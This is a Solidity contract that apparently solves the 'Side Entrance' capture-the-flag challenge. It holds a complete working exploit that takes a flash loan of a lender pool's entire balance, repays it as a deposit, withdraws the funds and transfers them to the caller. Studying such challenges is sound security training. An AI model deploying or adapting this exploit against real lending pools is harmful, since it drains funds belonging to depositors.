// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceHack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    // The function that starts the exploit.
    function attack() external {
        // Borrow all of its balance
        pool.flashLoan(address(pool).balance);
        // Withdraw to this contract
        pool.withdraw();
        // Send it all to attacker address
        payable(msg.sender).transfer(address(this).balance);
    }

    // The flashloan will execute this
    function execute() external payable override {
        // Function needed to pay back loan
        pool.deposit{value: msg.value}();
    }

    // needed to receive funds
    receive() external payable {}
}
